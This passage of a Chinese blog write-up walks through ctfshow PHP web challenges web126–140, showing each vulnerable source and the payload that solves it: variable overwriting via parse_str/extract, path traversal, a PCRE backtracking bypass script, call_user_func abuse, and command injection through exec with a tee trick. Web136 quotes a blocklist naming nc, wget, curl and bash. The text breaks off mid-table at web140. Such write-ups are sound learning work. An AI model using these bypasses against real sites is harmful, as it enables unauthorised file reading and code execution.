class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">payload:<br>GET: ?a=<span class="hljs-number">1</span>+fl0g=flag_give_me<br>POST:CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">parse_str</span><span class="hljs-params">($a[<span class="hljs-number">1</span>])</span></span><br></code></pre></td></tr></table></figure><p>+为空格<br>数组以空格来分割<br>a[0]&#x3D;1<br>a[1]&#x3D;fl0g&#x3D;flag_give_me<br>且parse_str($a[1])为16个字符满足条件</p><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$ctf_show</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><br><span class="hljs-comment">//特殊字符检测</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;嗯哼？&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf_show</span>===<span class="hljs-string">&#x27;ilove36d&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于PHP的变量名不能带[点]和[空格]，所以它们会被转化成下划线<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET:<br>?ctf <span class="hljs-attribute">show</span>=ilove36d<br></code></pre></td></tr></table></figure><p>因为空格没有禁用而+和.被禁用，所以用’ ‘来代替</p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$f1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br><span class="hljs-variable">$f2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$f1</span>))&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>)));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;嗯哼？&quot;</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>特殊字符为函数只有一个_()，_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数</p><p>get_defined_vars() 函数返回由所有已定义变量所组成的数组。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">payload:</span><br>?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=phpinfo</span><br></code></pre></td></tr></table></figure><p><img src="/images/I63.png"></p><p>发现gettext开启</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">payload:</span><br>?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=get_defined_vars</span><br></code></pre></td></tr></table></figure><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$f</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>readfile() 函数读取一个文件，并写入到输出缓冲。<br>目录穿越<br>我们可以一级一级返回上级目录再进入到我们想进入的目录中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload:<br>?f=..<span class="hljs-regexp">/../</span>ctfshow<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125; <br></code></pre></td></tr></table></figure><p>第一个<code>if(preg_match(&#39;/.+?ctfshow/is&#39;, $f))</code><br>is中 i代表匹配大小写 s代表匹配换行<br>+?代表ctfshow前面至少有一个字符才能匹配<br>if(stripos($f, ‘ctfshow’) &#x3D;&#x3D;&#x3D; FALSE)只要$f中能匹配到ctfshow,返回的int值都会不等于FALSE</p><p>所以<br>payload：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">POST:</span><br>f=ctfshow<br></code></pre></td></tr></table></figure><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;36Dctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125; <br></code></pre></td></tr></table></figure><p>先看stripos()函數，它的意思是查找 “string” 在字符串中第一次出现的位置：<br>所以说36Dctfshow必须在f中出现，但同时preg_match函数过滤了ctfshow，所以我们考虑绕过preg_match函数<br>一共有以下几种方法绕过preg_match函数</p><ol><li>数组绕过preg_match只能处理字符串，当传入的subject是数组时会返回false</li><li>换行符绕过，preg_match不会匹配换行符例如: &#x2F;?value&#x3D;%0ashell.php 则会成功传入<br>&#x2F;?value&#x3D;shell.php</li><li>PCRE回溯限制次数绕过，这个通俗的讲便是重复的填入正常字符串一般往里面插入个100个字母便可，让preg_match函数一直回溯一直回溯，直到吹灯拔蜡返回false</li></ol><p>前两种方式提交发现并不能绕过返回flag<br>那么用第三种方法<br>首先在php编译器运行下列代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;fukk&#x27;</span>, <span class="hljs-string">&#x27;250000&#x27;</span>).<span class="hljs-string">&#x27;36Dctfshow&#x27;</span>;<br></code></pre></td></tr></table></figure><p>str_repeat是用于复制<br>复制粘贴到post，如果因为复制的太多而无法复制到最后面的36Dctfshow,那么手动添加即可，提交得到flag</p><p>也可以python写一个脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>url = <span class="hljs-string">&#x27;http://49eb1749-d5f4-4cfd-b5ef-4e14a38d2463.challenge.ctf.show/&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;fukk&#x27;</span> * 250000 + <span class="hljs-string">&#x27;36Dctfshow&#x27;</span><br>&#125;<br>r = requests.post(<span class="hljs-attribute">url</span>=url, <span class="hljs-attribute">data</span>=data).text<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>本题是一个网页，进去随便点一点，没有发现可用的信息<br>回想web4里有个提示：”总有人把后台地址写入robots”<br>url输入robots.txt<br>获得一个提示<br>进入admin<br>或者可以用御剑来扫描<br><strong>御剑是用来方便查找用户后台登录地址</strong><br>也可以得到admin<br>进入admin得到下面代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> === <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x36D</span>) &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-variable">$flag</span> || <span class="hljs-variable">$username</span> ===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> == <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>再来分析<code>if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</code></p><p>第一个code让他为false，password也为false，只要username为真，就能通过if<br>所以payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">code</span><span class="hljs-operator">=</span><span class="hljs-number">888</span><span class="hljs-variable">&amp;password</span>=<span class="hljs-number">888</span><span class="hljs-variable">&amp;username</span>=admin<br><br></code></pre></td></tr></table></figure><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> == <span class="hljs-string">&#x27;36d&#x27;</span> &amp;&amp; <span class="hljs-variable">$key2</span> == <span class="hljs-string">&#x27;36d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>看到parse_str和extract，变量覆盖<br>第一条if判断，要求key1和key2不能通过get和post传递</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">parse_str</span><span class="hljs-params">()</span></span>:把查询字符串解析到变量中<br><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">()</span></span>:函数从数组中将变量导入到当前的符号表<br>$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]</span><br>query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据<br></code></pre></td></tr></table></figure><p>parse_str是对get请求进行的内容解析成变量，例如传递?a&#x3D;1,执行后就是$a&#x3D;1.<br>那么相对的，传递_POST,就是对$_POST进行赋值，正好就可以绕过if条件对post的限制。extract()函数从数组中将变量导入到当前的符号表。</p><p>payload:<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">function check($x)&#123;<br>    if(preg_match(&#x27;/\\$|<span class="hljs-string">\.</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\&#125;</span>|<span class="hljs-string">\&gt;</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">nc</span>|<span class="hljs-string">wget</span>|<span class="hljs-string">exec</span>|<span class="hljs-string">bash</span>|<span class="hljs-string">sh</span>|<span class="hljs-string">netcat</span>|<span class="hljs-string">grep</span>|<span class="hljs-string">base64</span>|<span class="hljs-string">rev</span>|<span class="hljs-string">curl</span>|<span class="hljs-string">wget</span>|<span class="hljs-string">gcc</span>|<span class="hljs-string">php</span>|<span class="hljs-string">python</span>|<span class="hljs-string">pingtouch</span>|<span class="hljs-string">mv</span>|<span class="hljs-string">mkdir</span>|<span class="hljs-string">cp/i&#x27;, $x))&#123;</span><br><span class="hljs-string">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="hljs-string">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="hljs-string">    check($c);</span><br><span class="hljs-string">    exec($c);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else&#123;</span><br><span class="hljs-string">    highlight_file(__FILE__);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>tee用于显示程序的输出并将其复制到一个文件中<br>payload:<code>?c=ls |tee 1</code><br>访问1有index.php 没有flag文件<br>payload:<code>?c=ls / | tee 1</code><br>找到flag文件f149_15_h3r3<br>payload:<code>?c=cat /f149_15_h3r3|tee 1</code><br>flag😍</p><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]); <br></code></pre></td></tr></table></figure><p>本题考查<a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func()</a>的使用，需要调用ctfshow类里的getFlag方法<br><img src="/images/TONNBV45XFX45LF.png"><br>调用方法如图所示<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST<br><span class="hljs-attribute">ctfshow</span>=ctfshow::getFlag<br></code></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">if</span>(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-built_in">die</span>(&quot;private function&quot;);<br>&#125;<br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]); <br></code></pre></td></tr></table></figure><p>strripos()函数可被数组绕过<br>所以payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span><br><span class="hljs-attribute">ctfshow</span>[<span class="hljs-number">0</span>]=ctfshow&amp;ctfshow[<span class="hljs-number">1</span>]=getFlag<br></code></pre></td></tr></table></figure><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>tip</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 